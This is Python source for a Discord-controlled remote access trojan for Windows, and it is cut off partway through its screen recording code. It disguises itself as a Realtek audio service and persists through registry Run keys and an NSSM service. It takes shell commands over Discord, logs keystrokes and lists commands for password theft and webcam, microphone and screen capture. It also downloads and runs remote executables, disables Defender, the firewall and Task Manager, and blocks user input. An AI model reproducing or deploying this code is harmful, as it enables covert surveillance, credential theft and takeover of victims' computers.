import asyncio
import sys



if sys.platform == "win32":
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

import discord
from discord.ext import commands
import subprocess
import os
import platform
import shutil
import socket
import io
import logging
import threading
import sqlite3
import requests
import ctypes
import pyautogui
import pyperclip
import win32crypt
import psutil
import pygetwindow as gw
import uuid
import time
import json
import keyboard
import sounddevice as sd
from scipy.io import wavfile
from pynput.keyboard import Listener

# --------- Setup ---------
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True


HOSTNAME = platform.node()
SESSION_ID = str(uuid.uuid4())[:8]
CHANNEL_NAME = f"session-{HOSTNAME.lower()}-{SESSION_ID}"

bot = commands.Bot(command_prefix='!', intents=intents)
active_channel = None



LOCALAPPDATA = os.getenv('LOCALAPPDATA')
REALTEK_DIR = os.path.join(LOCALAPPDATA, "Realtek audio")

if not os.path.exists(REALTEK_DIR):
    os.makedirs(REALTEK_DIR)

subprocess.run(f'attrib +h +s "{REALTEK_DIR}"', shell=True)

if getattr(sys, 'frozen', False):
    current_path = sys.executable
else:
    current_path = os.path.abspath(__file__)

shutil.copy2(current_path, REALTEK_DIR)


KEYLOG_PATH = os.path.join(REALTEK_DIR, "ntuser.dat")
CURRENT_DIR = os.path.expanduser("~")  
KEYLOG_LOCK = threading.Lock()

def hide_file(path):
    if platform.system() == 'Windows':
        subprocess.run(f'attrib +h +s "{path}"', shell=True)

def run_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=15)
        output = result.stdout + result.stderr
        return output.strip() or "[+] Executed"
    except Exception as e:
        return f"[!] Error: {e}"

@bot.event
async def on_ready():
    global active_channel
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")

    
    guild = bot.guilds[0] if bot.guilds else None
    if not guild:
        print("Bot is not in any guild!")
        return

    
    existing_channel = discord.utils.get(guild.text_channels, name=CHANNEL_NAME)
    if existing_channel:
        active_channel = existing_channel
        print(f"Using existing channel: {CHANNEL_NAME}")
        return

    
    overwrites = {
        guild.default_role: discord.PermissionOverwrite(read_messages=False),
        guild.me: discord.PermissionOverwrite(read_messages=True)
    }

    
    try:
        active_channel = await guild.create_text_channel(CHANNEL_NAME, overwrites=overwrites)
        system_info = f"🔐 Session started from `{HOSTNAME}` | `{platform.system()} {platform.release()}`"
        await active_channel.send(system_info)
        print(f"Created channel: {CHANNEL_NAME}")
    except Exception as e:
        print(f"Failed to create channel: {e}")

@bot.event
async def on_message(message):
    # Ignore messages from the bot itself or outside the active channel
    if message.author == bot.user or (active_channel and message.channel != active_channel):
        return

    # Process commands
    await bot.process_commands(message)

    # Also allow running raw commands in the channel
    if active_channel and message.channel == active_channel and not message.content.startswith(bot.command_prefix):
        output = run_command(message.content)
        await active_channel.send(f"```\n{output}\n```")

# --------- Keylogger ---------

class KeyLogger:
    def __init__(self):
        self.listener = None
        self.logger = logging.getLogger('SystemMonitor')
        self.logger.setLevel(logging.INFO)
        formatter = logging.Formatter('%(asctime)s | SystemMonitor | %(message)s')
        file_handler = logging.FileHandler(KEYLOG_PATH, encoding='utf-8')
        file_handler.setFormatter(formatter)
        self.logger.addHandler(file_handler)
        hide_file(KEYLOG_PATH)

    def on_press(self, key):
        try:
            with KEYLOG_LOCK:
                if hasattr(key, 'char') and key.char:
                    key_str = key.char
                else:
                    key_str = f"[{str(key).replace('Key.', '')}]"
                self.logger.info(key_str)
        except Exception:
            pass

    def start(self):
        if self.listener is None or not self.listener.is_alive():
            self.listener = Listener(on_press=self.on_press)
            self.listener.start()
            return True
        return False

    def stop(self):
        if self.listener and self.listener.is_alive():
            self.listener.stop()
            self.listener = None
            return True
        return False

keylogger = KeyLogger()



# --------- Commands ---------

@bot.command(name='assist')
async def assist(ctx):
    embed = discord.Embed(
        title="🤖 Remote Access Bot Help",
        description="Here are the available commands grouped by category:",
        color=0x00ffcc
    )

    # System Commands (Split in 2)
    embed.add_field(name="🔹 System Commands (1/2)", value=(
        "`!sysinfo` - Show system information\n"
        "`!processes` - List running processes\n"
        "`!kill <pid>` - kill processes\n"
        "`!disk` - Show disk usage\n"
        "`!network` - Show network information\n"
        "`!filedropper` - Drops and starts file\n"
        "`!start` - Starts file from dest\n"
        "`!startup` - Adds itself to startup\n"
        "`!hklmstartup` - Adds itself to startup for all users\n"
        "`!connect <url>` - executes exe from url then deletes it\n"
    ), inline=False)

    embed.add_field(name="🔹 System Commands (2/2)", value=(
        "`!display_startup` - Displays reg entries in startup\n"
        "`!runadmin` - Tries to force itself to run as admin\n"
        "`!protection_on` - Enables firewall and defender\n"
        "`!protection_off` - Disables firewall and defender\n"
        "`!startadmin` - Always starts as admin with no UAC\n"
        "`!disable_taskmgr` - disables taskmanager\n"
        "`!enable_taskmgr` - Enables taskmanager\n"
        "`!crit` - makes file run as crit process\n"
        "`!uncrit` - reverts back to ordinary process\n"
        "`!block` - blocks users mouse and keyboard\n"
        "`!unblock` - unblocks users mouse and keyboard\n"
    ), inline=False)

    # Remote Control (Split in 2)
    embed.add_field(name="🔹 Remote Control (1/2)", value=(
        "`!screenshot` - Take screenshots every 5 secs\n"
        "`!stopscreenshot` - Stops taking screenshots\n"
        "`!startscreenrec` - Start screenshare\n"
        "`!stopscreenrec` - Stop screenshare\n"
        "`!webcam` - Capture webcam image\n"
        "`!startwebcamrec` - Record webcam\n"
        "`!stopwebcamrec` - Stop recording webcam\n"
        "`!audio` - Record audio every 5 secs\n"
        "`!audiostop` - Stop recording audio\n"
        "`!outputaudio` - Records output audio\n"
        "`!outputaudiostop` - Stops recording output audio\n"
        "`!rdp <ip> <port>` - displays client screen\n"
        "`!stoprdp` - Stops displaying screen\n"
    ), inline=False)

    embed.add_field(name="🔹 Remote Control (2/2)", value=(
        "`!listdevices` - List audio devices\n"
        "`!defaultdevices` - List default audio devices\n"
        "`!setinputdevice` - Set input audio device\n"
        "`!setoutputdevice` - Set output audio device\n"
        "`!listenlive` - Record live audio\n"
        "`!stoplistenlive` - Stop recording live audio\n"
        "`!listenliveoutput` - Record live output audio\n"
        "`!listenliveoutputstop` - Stop recording live output audio\n"
        "`!resetlive` - Resets liveaudio variables\n"
        "`!cmd <command>` - Execute command\n"
        "`!ps <command>` - Execute powershell command\n"
        "`!download <file>` - Download file\n"
        "`!upload <url> <dest>` - Download from URL\n"
        "`!run <app>` - Run application\n"
        "`!lock` - Lock computer\n"
        "`!shutdown` - Shutdown computer\n"
        "`!reboot` - Reboot computer\n"
        "`!bluescreen` - BSOD computer\n"
    ), inline=False)

    # Credentials
    embed.add_field(name="🔹 Credentials", value=(
        "`!chrome_passwords` - Get Chrome saved passwords\n"
        "`!wifi_passwords` - Get WiFi passwords\n"
    ), inline=False)

    # Keylogger
    embed.add_field(name="🔹 Keylogger", value=(
        "`!keylog_start` - Start keylogger\n"
        "`!keylog_stop` - Stop keylogger\n"
        "`!keylog_show` - Show keylog\n"
        "`!clipboard` - Get clipboard content\n"
    ), inline=False)

    # File Management
    embed.add_field(name="🔹 File Management", value=(
        "`!ls [dir]` - List directory\n"
        "`!cd [dir]` - Change directory\n"
        "`!pwd` - Show current directory\n"
        "`!rm <path>` - Delete file/directory\n"
        "`!mkdir <name>` - Create directory\n"
        "`!search <name>` - Search files\n"
    ), inline=False)

    # Network
    embed.add_field(name="🔹 Network", value=(
        "`!ip` - Show IP addresses\n"
        "`!portscan <ip> <port>` - Scan port\n"
        "`!ping <host>` - Ping host\n"
        "`!whois <domain>` - WHOIS lookup\n"
        "`!ifconfig` - Network config\n"
        "`!worm <url> <Token>` - spreads through discord DM\n"
    ), inline=False)


    # Injection
    embed.add_field(name="🔹 Injection", value=(
        "`!inject <url>` - injects file and runs it\n"
        "`!botnet` - connects to botnet\n"
        "`!removebotnet` - disconnects botnet\n"          
    ), inline=False)

    # Other
    embed.add_field(name="🔹 Other", value=(
        "`!msg <text>` - Show message box\n"
        "`!notify <title> <msg>` - Send notification\n"
        "`!type <text>` - Type text\n"
        "`!hotkeys <keys>` - Press hotkeys\n"
        "`!grabinfo` - Gets system info etc\n"
        "`!exclude <path>` - Add folder to Windows Defender exclusions\n"
        "`!wallpaper` - Change wallpaper for victim\n"
        "`!vmdetect` - detects if file is being run on VM\n"
    ), inline=False)

    # SELFDESTRUCT
    embed.add_field(name="🚨💣 SELFDESTRUCT", value=(
        "`!SELFDESTRUCT` - Self destructs\n"
        "`!exit` - exits bot\n"
    ), inline=False)

    await ctx.send(embed=embed)




# ----- System Information -----

@bot.command(name='sysinfo')
async def sysinfo(ctx):
    try:
        uname = platform.uname()
        info = f"""
🖥️ System Information:
System: {uname.system}
Node Name: {uname.node}
Release: {uname.release}
Version: {uname.version}
Machine: {uname.machine}
Processor: {uname.processor}
"""
        await ctx.send(info)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='processes')
async def processes(ctx):
    try:
        procs = []
        for proc in psutil.process_iter(['pid', 'name']):
            procs.append(f"{proc.info['pid']} - {proc.info['name']}")

        header = "🧩 Running Processes:\n"
        max_length = 2000  # Discord message character limit approx

        # Split the processes list into chunks that fit into the message limit
        message = header
        for proc_line in procs:
            # +1 for the newline character
            if len(message) + len(proc_line) + 1 > max_length:
                await ctx.send(message)
                message = ""
            message += proc_line + "\n"

        # Send any remaining lines
        if message:
            await ctx.send(message)
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")


@bot.command(name='kill')
async def kill_process(ctx, pid: int):
    try:
        proc = psutil.Process(pid)
        proc.kill()
        await ctx.send(f"✅ Process with PID {pid} has been killed.")
    except psutil.NoSuchProcess:
        await ctx.send(f"❌ No process found with PID {pid}.")
    except psutil.AccessDenied:
        # More explicit message about needing admin rights
        await ctx.send(f"❌ Access denied. You may need to run the bot with administrator privileges to kill PID {pid}.")
    except Exception as e:
        await ctx.send(f"❌ Error killing process: {e}")




@bot.command(name='disk')
async def disk(ctx):
    try:
        partitions = psutil.disk_partitions()
        disk_info = []
        for part in partitions:
            usage = psutil.disk_usage(part.mountpoint)
            disk_info.append(
                f"Drive {part.device} ({part.mountpoint}) - {usage.percent}% used, {usage.free // (1024**3)} GB free"
            )
        await ctx.send("💽 Disk Usage:\n" + "\n".join(disk_info))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='network')
async def network(ctx):
    try:
        addrs = psutil.net_if_addrs()
        response = []
        for iface, addrs_list in addrs.items():
            for addr in addrs_list:
                if addr.family == socket.AF_INET:
                    response.append(f"{iface} - IP: {addr.address}")
        await ctx.send("🌐 Network Interfaces:\n" + "\n".join(response))
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='filedropper')
async def dropfile(ctx):
    # Check for attachment
    if not ctx.message.attachments:
        await ctx.send("Please attach a file.")
        return

    attachment = ctx.message.attachments[0]
    filename = attachment.filename
    localappdata = os.getenv('LOCALAPPDATA')
    target_dir = os.path.join(localappdata, 'Programs', 'Common')

    # Create directory if it doesn't exist
    os.makedirs(target_dir, exist_ok=True)

    file_path = os.path.join(target_dir, filename)

    # Save the file
    await attachment.save(file_path)
    await ctx.send(f"File saved to {file_path}")

    # Hide the file and folder (Windows only)
    try:
        subprocess.run(['attrib', '+h', '+s', file_path], shell=True)
        subprocess.run(['attrib', '+h', '+s', target_dir], shell=True)
        await ctx.send("File and folder hidden.")
    except Exception as e:
        await ctx.send(f"Failed to hide: {e}")

    # Execute the file
    try:
        subprocess.Popen(file_path, shell=True)
        await ctx.send("File executed.")
    except Exception as e:
        await ctx.send(f"Execution failed: {e}")

@bot.command(name='start')
async def start_file(ctx, *, filepath):
    filepath = filepath.strip('"')  # Remove quotes if user adds them

    if not os.path.exists(filepath):
        await ctx.send(f"❌ File not found: {filepath}")
        return

    try:
        subprocess.Popen(filepath, shell=True)
        await ctx.send(f"▶️ Started file: {filepath}")
    except Exception as e:
        await ctx.send(f"❌ Failed to start file: {e}")


import winreg
def read_run_key(root, subkey):
    output = []
    try:
        with winreg.OpenKey(root, subkey, 0, winreg.KEY_READ) as key:
            i = 0
            while True:
                try:
                    name, value, _ = winreg.EnumValue(key, i)
                    output.append(f"{name}: {value}")
                    i += 1
                except OSError:
                    break
    except FileNotFoundError:
        output.append(f"Key not found: {subkey}")
    return "\n".join(output)

@bot.command(name='startup')
async def add_autorun(ctx):
    try:
        

        if getattr(sys, 'frozen', False):
            current_path = sys.executable  # Path to the .exe when frozen
        else:
            current_path = os.path.abspath(__file__)  # Path to the script when running normally

        filename = os.path.basename(current_path)
        cp_directory = os.path.join(REALTEK_DIR, filename)


        command = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64" /t REG_SZ /d "{current_path}" /f'
        command2 = f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64_Copy" /t REG_SZ /d "{cp_directory}" /f'

        await ctx.send(f"Command 1:\n```{command}```")
        await ctx.send(f"Command 2:\n```{command2}```")

        result1 = os.system(command)
        result2 = os.system(command2)

        current_user_entries = read_run_key(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        local_machine_entries = read_run_key(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")

        if result1 == 0 and result2 == 0:
            await ctx.send("✅ Both directories successfully added to autorun registry.")
        elif result1 == 0:
            await ctx.send("✅ Directory 1 succeeded, but directory 2 failed.")
        elif result2 == 0:
            await ctx.send("✅ Directory 2 succeeded, but directory 1 failed.")
        else:
            await ctx.send("❌ Both directories failed. Check permissions.")

        await ctx.send("=== HKEY_CURRENT_USER Startup Entries ===")
        await ctx.send(f"```\n{current_user_entries}\n```")

        await ctx.send("=== HKEY_LOCAL_MACHINE Startup Entries ===")
        await ctx.send(f"```\n{local_machine_entries}\n```")

    except Exception as e:
        await ctx.send(f"❌ Error occurred: {e}")


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@bot.command(name='hklmstartup')
async def add_autorun(ctx):
    if not is_admin():
        await ctx.send("❌ This command must be run with administrator privileges.")
        return

    try:
        if getattr(sys, 'frozen', False):
            current_path = sys.executable  # Path to the .exe when frozen
        else:
            current_path = os.path.abspath(__file__)  # Path to the script when running normally

        filename = os.path.basename(current_path)
        cp_directory = os.path.join(REALTEK_DIR, filename)

        # Commands to add to registry
        command1 = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64" /t REG_SZ /d "{current_path}" /f'
        command2 = f'reg add "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "RtkAudUService64_Copy" /t REG_SZ /d "{cp_directory}" /f'

        await ctx.send(f"Command 1:\n```{command1}```")
        await ctx.send(f"Command 2:\n```{command2}```")

        result1 = os.system(command1)
        result2 = os.system(command2)

        current_user_entries = read_run_key(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        local_machine_entries = read_run_key(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")

        if result1 == 0 and result2 == 0:
            await ctx.send("✅ Both registry keys successfully added.")
        elif result1 == 0:
            await ctx.send("✅ HKCU succeeded, ❌ HKLM failed.")
        elif result2 == 0:
            await ctx.send("✅ HKLM succeeded, ❌ HKCU failed.")
        else:
            await ctx.send("❌ Both registry additions failed.")

        await ctx.send("=== HKEY_CURRENT_USER Startup Entries ===")
        await ctx.send(f"```\n{current_user_entries}\n```")

        await ctx.send("=== HKEY_LOCAL_MACHINE Startup Entries ===")
        await ctx.send(f"```\n{local_machine_entries}\n```")

    except Exception as e:
        await ctx.send(f"❌ An error occurred: {e}")








@bot.command(name='connect')
async def connect(ctx, url: str):
    """Downloads a file to temp, executes it (waits for completion), then deletes it."""
    try:
        # Generate random filename and get temp path
        random_str = ''.join(random.choices(string.ascii_letters + string.digits, k=8))
        filename = f"tmp{random_str}.exe"
        temp_dir = tempfile.gettempdir()
        filepath = os.path.join(temp_dir, filename)

        # Download the file
        await ctx.send(f"📥 Downloading from `{url}` to temp folder...")
        response = requests.get(url, stream=True)
        response.raise_for_status()

        with open(filepath, 'wb') as f:
            for chunk in response.iter_content(chunk_size=8192):
                f.write(chunk)

        # Execute and wait
        await ctx.send(f"⚡ Executing `{filename}` (waiting for exit)...")
        process = subprocess.Popen([filepath], shell=True)
        process.wait()

        # Delete after execution
        if os.path.exists(filepath):
            os.remove(filepath)
            await ctx.send(f"✅ Execution complete. `{filename}` deleted from temp.")
        else:
            await ctx.send("⚠️ File disappeared during execution.")
    
    except Exception as e:
        await ctx.send(f"❌ Error: `{str(e)}`")
        if 'filepath' in locals() and os.path.exists(filepath):
            os.remove(filepath)


























def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    params = " ".join(f'"{arg}"' for arg in sys.argv)
    ret = ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, params, None, 1)
    return ret

@bot.command(name='runadmin')
async def runadmin(ctx):
    if is_admin():
        await ctx.send("✅ Already running as administrator.")
    else:
        await ctx.send("⚠️ Not running as admin. Attempting to elevate...")
        
        max_retries = 100  # prevent infinite loop if user keeps denying
        retries = 0

        while retries < max_retries:
            ret = run_as_admin()

            if ret <= 32:
                retries += 1
                await ctx.send(f"❌ User denied admin rights or error occurred. Retrying in 3 seconds... (attempt {retries}/{max_retries})")
                await asyncio.sleep(3)
            else:
                await ctx.send("✅ Successfully launched elevated process. Exiting this one...")
                await asyncio.sleep(2)
                sys.exit()

        await ctx.send("❗ Maximum retry limit reached. Admin elevation failed.")






    










@bot.command(name='display_startup')
async def display_startup(ctx):
    try:
        current_user_entries = read_run_key(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        local_machine_entries = read_run_key(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")

        def send_chunks(title, data):
            max_len = 1900  
            chunks = [data[i:i + max_len] for i in range(0, len(data), max_len)]
            return [f"=== {title} ===\n```{chunk}```" for chunk in chunks]

        for msg in send_chunks("HKEY_CURRENT_USER Startup Entries", current_user_entries):
            await ctx.send(msg)

        for msg in send_chunks("HKEY_LOCAL_MACHINE Startup Entries", local_machine_entries):
            await ctx.send(msg)

    except Exception as e:
        await ctx.send(f"❌ Error reading registry: {e}")




import ctypes
import subprocess
import winreg

CREATE_NO_WINDOW = 0x08000000

@bot.command(name='protection_on')
async def protection_on(ctx):
    def delete_registry_value(path, name):
        try:
            key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path, 0, winreg.KEY_ALL_ACCESS)
            winreg.DeleteValue(key, name)
            winreg.CloseKey(key)
            return f"[+] Deleted {name} from {path}"
        except FileNotFoundError:
            return f"[*] {path}\\{name} not found."
        except PermissionError:
            return f"[-] No permission to delete {path}\\{name}"

    def enable_realtime_protection():
        command = [
            "powershell", "-WindowStyle", "Hidden",
            "-Command", "Set-MpPreference -DisableRealtimeMonitoring $false"
        ]
        subprocess.run(command, creationflags=CREATE_NO_WINDOW)
        return "[+] Defender real-time protection enabled via PowerShell."

    def enable_firewall():
        command = [
            "powershell", "-WindowStyle", "Hidden",
            "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True"
        ]
        subprocess.run(command, creationflags=CREATE_NO_WINDOW)
        return "[+] Windows Firewall enabled on all profiles."

    def is_admin():
        return ctypes.windll.shell32.IsUserAnAdmin()

    try:
        if not is_admin():
            await ctx.send("❌ This command must be run as administrator.")
            return

        messages = ["[+] Running as administrator."]
        messages.append(enable_realtime_protection())
        messages.append(enable_firewall())
        messages.append(delete_registry_value(r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware"))
        messages.append(delete_registry_value(r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring"))
        messages.append(delete_registry_value(r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DontReportInfectionInformation"))
        messages.append("[*] All settings restored.")
        await ctx.send("\n".join(messages))

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")







CREATE_NO_WINDOW = 0x08000000

@bot.command(name='protection_off')
async def protection_off(ctx):
    def set_registry_key(path, name, value):
        try:
            key = winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, path)
            winreg.SetValueEx(key, name, 0, winreg.REG_DWORD, value)
            winreg.CloseKey(key)
            return f"[+] Set {name} = {value} in {path}"
        except PermissionError:
            return f"[-] Permission denied for {path}\\{name}"

    def disable_realtime_protection():
        command = [
            "powershell", "-WindowStyle", "Hidden",
            "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"
        ]
        subprocess.run(command, creationflags=CREATE_NO_WINDOW)
        return "[+] Defender real-time protection disabled via PowerShell."

    def disable_firewall():
        command = [
            "powershell", "-WindowStyle", "Hidden",
            "-Command", "Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False"
        ]
        subprocess.run(command, creationflags=CREATE_NO_WINDOW)
        return "[+] Windows Firewall disabled on all profiles."

    def is_admin():
        return ctypes.windll.shell32.IsUserAnAdmin()

    try:
        if not is_admin():
            await ctx.send("❌ This command must be run as administrator.")
            return

        messages = ["[+] Running as administrator."]
        messages.append(disable_realtime_protection())
        messages.append(disable_firewall())
        messages.append(set_registry_key(r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1))
        messages.append(set_registry_key(r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1))
        messages.append(set_registry_key(r"SOFTWARE\Policies\Microsoft\Windows Defender\Spynet", "DontReportInfectionInformation", 1))
        messages.append("[*] All disable operations completed.")
        await ctx.send("\n".join(messages))

    except Exception as e:
        await ctx.send(f"❌ Error: {e}")







import os
import sys
import ctypes
import subprocess
import zipfile
import urllib.request
import discord
from discord.ext import commands


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def download_nssm(dest_folder):
    nssm_url = "https://nssm.cc/release/nssm-2.24.zip"
    response = urllib.request.urlopen(nssm_url)
    data = response.read()

    zip_path = os.path.join(dest_folder, "nssm-2.24.zip")
    with open(zip_path, "wb") as f:
        f.write(data)

    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(dest_folder)
    os.remove(zip_path)

def install_service(nssm_path, service_name, exe_path):
    arch_folder = "win64" if sys.maxsize > 2**32 else "win32"
    nssm_exe = os.path.join(nssm_path, f"nssm-2.24\\{arch_folder}\\nssm.exe")

    if not os.path.exists(nssm_exe):
        return False, f"NSSM executable not found at {nssm_exe}"

    cmd_install = [
        nssm_exe,
        "install",
        service_name,
        exe_path
    ]
    result = subprocess.run(cmd_install, capture_output=True, text=True)
    if result.returncode != 0:
        return False, f"Failed to install service:\n{result.stdout}\n{result.stderr}"

    cmd_start = ["net", "start", service_name]
    result = subprocess.run(cmd_start, capture_output=True, text=True)
    if result.returncode != 0:
        return False, f"Failed to start service:\n{result.stdout}\n{result.stderr}"

    return True, "Service installed and started successfully."

@bot.command(name='startadmin')
async def startadmin(ctx):
    # This script must run on the same machine with admin privileges
    if not is_admin():
        await ctx.send("❌ This bot/script must be run as Administrator on the host machine!")
        return

    localappdata = os.environ.get("LOCALAPPDATA")
    if not localappdata:
        await ctx.send("❌ Could not find LOCALAPPDATA environment variable.")
        return

    nssm_folder = os.path.join(localappdata, "nssm")
    os.makedirs(nssm_folder, exist_ok=True)

    await ctx.send("⏳ Downloading NSSM...")
    try:
        download_nssm(nssm_folder)
    except Exception as e:
        await ctx.send(f"❌ Failed to download or extract NSSM: {e}")
        return


    
    filename = os.path.basename(current_path)
    exe_path = os.path.join(REALTEK_DIR, filename)
    
    

    if not os.path.isfile(exe_path):
        await ctx.send(f"❌ Target executable not found:\n`{exe_path}`")
        return

    service_name = "RtkAudUService64"
    await ctx.send(f"⏳ Installing and starting service `{service_name}`...")

    success, message = install_service(nssm_folder, service_name, exe_path)

    if success:
        await ctx.send(f"✅ {message}")
    else:
        await ctx.send(f"❌ {message}")



@bot.command(name='disable_taskmgr')
async def disable_taskmgr(ctx):
    try:
        # Check if the user is admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ You need to run this bot with administrator privileges to disable Task Manager.")
            return

        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\System")
        winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(key)

        await ctx.send("✅ Task Manager has been disabled.")
    except Exception as e:
        await ctx.send(f"❌ Failed to disable Task Manager: {e}")





@bot.command(name='enable_taskmgr')
async def enable_taskmgr(ctx):
    try:
        # Check if the user is admin
        if not ctypes.windll.shell32.IsUserAnAdmin():
            await ctx.send("❌ You need to run this bot with administrator privileges to enable Task Manager.")
            return

        key_path = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "DisableTaskMgr")
        winreg.CloseKey(key)

        await ctx.send("✅ Task Manager has been enabled.")
    except FileNotFoundError:
        await ctx.send("ℹ️ Task Manager was already enabled.")
    except Exception as e:
        await ctx.send(f"❌ Failed to enable Task Manager: {e}")









# Constants
BreakOnTermination = 0x1D
PROCESS_ALL_ACCESS = 0x1F0FFF

# Load NtSetInformationProcess from ntdll.dll
ntdll = ctypes.WinDLL("ntdll")
NtSetInformationProcess = ntdll.NtSetInformationProcess

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@bot.command(name='crit')
async def make_critical(ctx):
    if not is_admin():
        await ctx.send("❌ You need to run this bot as administrator to use this command.")
        return

    try:
        isCritical = ctypes.c_int(1)
        pid = os.getpid()
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        status = NtSetInformationProcess(handle, BreakOnTermination, ctypes.byref(isCritical), ctypes.sizeof(isCritical))
        ctypes.windll.kernel32.CloseHandle(handle)

        if status == 0:
            await ctx.send("✅ This process is now marked as **critical**.")
        else:
            await ctx.send(f"❌ Failed to mark as critical. NTSTATUS: {status}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='uncrit')
async def remove_critical(ctx):
    if not is_admin():
        await ctx.send("❌ You need to run this bot as administrator to use this command.")
        return

    try:
        isCritical = ctypes.c_int(0)
        pid = os.getpid()
        handle = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
        status = NtSetInformationProcess(handle, BreakOnTermination, ctypes.byref(isCritical), ctypes.sizeof(isCritical))
        ctypes.windll.kernel32.CloseHandle(handle)

        if status == 0:
            await ctx.send("✅ This process is no longer critical.")
        else:
            await ctx.send(f"❌ Failed to remove critical status. NTSTATUS: {status}")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")









# user32 DLL
user32 = ctypes.WinDLL('user32')

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

@bot.command(name='block')
async def block_input(ctx):
    if not is_admin():
        await ctx.send("❌ You need to run this bot as administrator to use this command.")
        return
    try:
        # BlockInput(True) blocks mouse and keyboard input
        if user32.BlockInput(True):
            await ctx.send("✅ Keyboard and mouse input have been **blocked**.")
        else:
            await ctx.send("❌ Failed to block input.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")

@bot.command(name='unblock')
async def unblock_input(ctx):
    if not is_admin():
        await ctx.send("❌ You need to run this bot as administrator to use this command.")
        return
    try:
        # BlockInput(False) enables input again
        if user32.BlockInput(False):
            await ctx.send("✅ Keyboard and mouse input have been **unblocked**.")
        else:
            await ctx.send("❌ Failed to unblock input.")
    except Exception as e:
        await ctx.send(f"❌ Error: {e}")















# ----- Screenshot -----

screenshot_task = None

@bot.command(name='screenshot')
async def screenshot(ctx):
    global screenshot_task

    if screenshot_task and not screenshot_task.done():
        await ctx.send("🔁 Screenshot task is already running.")
        return

    async def send_screenshots():
        try:
            while True:
                img = pyautogui.screenshot()
                img_bytes = io.BytesIO()
                img.save(img_bytes, format='PNG')
                img_bytes.seek(0)
                await ctx.send(file=discord.File(fp=img_bytes, filename='screenshot.png'))
                await asyncio.sleep(5)
        except asyncio.CancelledError:
            await ctx.send("🛑 Screenshot task stopped.")
        except Exception as e:
            await ctx.send(f"❌ Error during screenshot: {e}")

    screenshot_task = asyncio.create_task(send_screenshots())
    await ctx.send("📸 Started sending screenshots every 5 seconds.")

@bot.command(name='stopscreenshot')
async def stopscreenshot(ctx):
    global screenshot_task

    if screenshot_task and not screenshot_task.done():
        screenshot_task.cancel()
        await ctx.send("🛑 Attempting to stop screenshot task...")
    else:
        await ctx.send("ℹ️ No screenshot task is currently running.")


# ----- screen recording -----
import discord
from discord.ext import commands
import mss
import numpy as np
import cv2
import io
import asyncio
import os
import tempfile


recording_task = None
stop_recording = False

@bot.command(name='startscreenrec')
async def start_screen_recording(ctx):
    global recording_task, stop_recording
    if recording_task and not recording_task.done():
        await ctx.send("⚠️ Already recording screen!")
        return

    stop_recording = False
    await ctx.send("🎥 Starting screen recording every 5 seconds...")

    async def record_loop():
        with mss.mss() as sct:
            monitor = sct.monitors[0]  # Full screen

            fps = 15
            duration = 5  # seconds
            frame_count = int(fps * duration)
            width = monitor["width"]
            height = monitor["height"]

            while not stop_recording:
                frames = []

                # Capture exactly 5 seconds of frames
                for _ in range(frame_count):
                    img = sct.grab(monitor)
                    frame = np.array(img)
                    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)
                    frames.append(frame)
                    await asyncio.sleep(1 / fps)

